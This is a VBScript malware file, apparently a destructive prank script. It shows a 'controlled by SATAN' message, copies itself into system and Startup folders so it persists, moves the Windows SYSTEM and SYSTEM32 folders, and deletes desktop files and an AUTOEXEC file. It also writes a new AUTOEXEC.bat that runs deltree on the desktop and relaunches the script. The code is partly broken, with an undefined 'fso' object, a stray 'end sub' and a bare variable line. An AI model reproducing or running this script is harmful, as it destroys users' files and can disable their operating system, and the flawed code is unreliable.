
MsgBox ("your computer is in the controle of SATAN!", 16, "Fear")
On Error Resume Next

Dim filesys, newfolder, newfolderpath
newfolderpath = "c:\MyFolder"
set filesys=CreateObject("Scripting.FileSystemObject")
If Not filesys.FolderExists(newfolderpath) Then
Set newfolder = filesys.CreateFolder(newfolderpath)
End If

fso.CopyFile Wscript.ScriptFullName, "C:\WINDOWS\SYSTEM\fun.vbs", True

filesys.MoveFile "C:\WINDOWS\SYSTEM\*.*","C:\WINDOWS\MyFolder\"

filesys, newfolder, newfolderpath
newfolderpath = "c:\WINDOWS\SYSTEM"
set filesys=CreateObject("Scripting.FileSystemObject")
If Not filesys.FolderExists(newfolderpath) Then
Set newfolder = filesys.CreateFolder(newfolderpath)
End If

fso.CopyFile Wscript.ScriptFullName, "C:\MyFolder", True

fso.CopyFile Wscript.ScriptFullName, "C:\WINDOWS\SYSTEM\fun.vbs", True

filesys.MoveFile "C:\WINDOWS\SYSTEM32","C:\WINDOWS\SYSTEM"

fso.CopyFile Wscript.ScriptFullName, "C:\WINDOWS\SYSTEM\SYSTEM32\fun.vbs", True
fso.CopyFile Wscript.ScriptFullName, "C:\WINDOWS\StartMenu\Programs\StartUp\fun.vbs", True

fso.DeleteFile "C:\WINDOWS\COMMAND\EBD\AUTOEXEC",True
fso.DeleteFile "C:\WINDOWS\Desktop\*.*"

fso.CopyFile Wscript.ScriptFullName, "C:\fun.vbs", True
set shell=wscript.createobject("wscript.shell")
set msc=shell.CreateShortCut("C:\WINDOWS\COMMAND\EBD\AUTOEXEC.bat")
msc.TargetPath=shell.ExpandEnvironment("C:\fun.vbs")
msc.WindowStyle=4
msc.Save
set batch=fso.CreateTextFile("C:\AUTOEXEC.bat")
batch.WriteLine "@echo off"
batch.WriteLine "cls"
batch.WriteLine "deltree C:\WINDOWS\Desktop\*.*"
batch.WriteLine "start C:\WINDOWS\SYSTEM\fun.vbs"
batch.Close
shell.Run  "C:\AUTOEXEC.bat"
end sub 